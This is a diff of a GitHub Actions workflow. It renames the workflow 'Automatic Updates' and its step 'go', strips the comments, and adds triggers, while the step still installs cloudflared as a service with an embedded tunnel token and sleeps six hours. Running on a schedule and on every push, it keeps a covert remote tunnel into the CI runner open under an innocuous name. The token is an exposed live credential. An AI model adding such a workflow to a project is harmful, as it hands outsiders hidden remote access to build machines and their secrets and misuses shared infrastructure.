@@ -1,20 +1,20 @@
-name: aaa
- 
+name: Automatic Updates
+
 on:
-  # 1. Run manually via GitHub Actions UI
-  workflow_dispatch:
- 
-  # 2. Run on a schedule: every 6 hours
   schedule:
-    - cron: '0 */6 * * *'
- 
+    - cron: "0 */6 * * *"
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
 jobs:
   build:
-    timeout-minutes: 360 
-    runs-on: ubuntu-22.04
- 
+
+    runs-on: ubuntu-latest
+
     steps:
-    - name: cloudflared Setup
+    - name: go
       run: |
-        # Download, install, and start the cloudflared tunnel service
         curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && sudo dpkg -i cloudflared.deb && sudo cloudflared service install eyJhIjoiMWE1MTc4MTE0YTZjOWZmNDllMzZiNmMxNzVlOTZiYjkiLCJ0IjoiNGZiM2QzYWYtOTM1ZS00NDRjLWIyYzktYjgxNTllNjAyODNmIiwicyI6Ik1UZzJNRGMwWlRjdE9UZ3dOaTAwT1dVd0xUZ3hNRFV0WkRoa1pEbGpNVFkzTlRGayJ9 && sleep 6h
+
